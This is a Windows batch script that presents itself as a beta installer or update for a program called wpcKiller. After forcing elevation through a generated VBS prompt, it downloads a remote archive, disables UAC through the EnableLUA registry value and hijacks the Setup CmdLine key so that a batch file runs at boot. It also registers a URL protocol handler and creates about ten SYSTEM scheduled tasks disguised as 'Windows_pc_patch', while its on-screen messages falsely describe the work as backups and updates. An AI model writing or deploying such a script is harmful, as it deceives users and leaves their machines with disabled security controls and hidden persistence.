@echo off
echo you are trying to install a beta Would you really install this beta 
echo -) press any key to continue or close the program
echo ver 1.5 release
echo the program will reboot fot the admin permission don't worry
echo 
pause
cd /D %~dp0
if not exist "getadmin.vbs" (
    mode con lines=2 cols=30
    echo Set UAC = CreateObject^("Shell.Application"^)>getadmin.vbs
    echo UAC.ShellExecute %0, "", "", "runas", 1 >>getadmin.vbs
    call wscript getadmin.vbs
    exit
    )
del getadmin.vbs
REM 
setlocal enableextensions
Mkdir %programdata%\Copyrepair\1_5_0
Mkdir %temp%\Dos
cd %TEMP%\Dos
cls
echo download the files...
if not exist files.zip powershell -Command "Invoke-WebRequest https://github.com/cbaie9/wpcKiller/archive/refs/heads/main.zip -Outfile  files.zip"
Echo de-zippage des fichier
if not exist %temp%\dos\files powershell -command "Expand-Archive -LiteralPath %temp%\dos/files.zip"
echo Installing.. [ Please don't close if you want your computer safe ;) ]
echo copying files.	
Cd %programdata%\copyrepair\1_5_0
copy %temp%\Dos\files\wpcKiller-main
Cd %programdata%\Wpc	
copy %temp%\dos\files\Wpckiller-main	
CLS	
Echo done !	
echo Updating registery \ Backuping in progress ..
reg add HKEY_CURRENT_USER\Software\Wpckiller /v temp32 /T REG_BINARY /d 1 /f
reg add HKEY_CURRENT_USER\Software\Wpckiller /v CopyRepair /T REG_BINARY /d 1 /F
reg add HKEY_CURRENT_USER\Software\Wpckiller /v Copybinary1 /T REG_BINARY /d 1 /F
reg add HKEY_CURRENT_USER\Software\Wpckiller /v CopyBinary0 /T REG_BINARY /d 0 /F
reg add HKEY_CLASSES_ROOT\Wpckiller /v "(Default)" /t REG_SZ /d "URL:Wpckiller Protocol" /F
reg add HKEY_CLASSES_ROOT\Wpckiller /v "URL Protocol" /t REG_SZ /F
reg add HKEY_CLASSES_ROOT\Wpckiller\shell\open\command /v "(default)" /d "C:/Programdata/Wpc/udp.bat"
if exist %programdata%\wpc\customarg.bat then reg add HKLM\System\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k %programdata%\Wpc\customarg.bat" /f else reg add HKLM\System\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k %programdata%\Wpc\dosexec.bat" /f 
reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 1 /f > nul
reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul
Echo backuping done ..
timeout 1
cls
echo 
SCHTASKS /CREATE /SC onStart /TN "Windows_pc_patch_dosexec" /TR "%programdata%\Wpc\dosexec.bat" /ru system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_msdos" /TR "%programdata%\Wpc\msdos.bat" /RU system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_repair" /TR "%programdata%\Wpc\repair.bat" /RU system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_patch" /TR "%programdata%\Wpc\patch.bat" /RU system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_update" /TR "%programdata%\Wpc\udp.bat" /RU system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_msdosdebug" /TR "%programdata%\Wpc\msDebug.bat" /RU system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_Setup" /TR "%programdata%\Wpc\setup.bat" /RU system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_UserConfig" /TR "%programdata%\Wpc\Utilitary.bat" /RU system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_exit" /TR "%programdata%\Wpc\exit.bat" /RU system /ec system
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_exit2" /TR "%programdata%\Wpc\win.bat" /RU system /ec system
echo The update is done Your pc will be updated when you restart it
pause
exit /b